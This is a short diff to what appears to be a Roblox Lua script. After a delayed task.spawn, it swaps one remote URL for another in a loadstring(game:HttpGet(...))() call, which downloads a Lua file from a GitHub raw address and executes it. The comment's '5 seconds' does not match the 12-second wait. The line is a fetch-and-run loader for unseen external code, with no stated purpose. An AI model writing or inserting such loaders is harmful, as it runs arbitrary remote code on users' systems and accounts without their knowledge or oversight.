@@ -12,7 +12,7 @@ end)
 
 task.spawn(function()
     task.wait(12) -- Wait 5 seconds before executing
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/NEWOP.github.io/refs/heads/main/erj.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/weuhwej.github.io/refs/heads/main/man.lua"))()
 end)
 
 
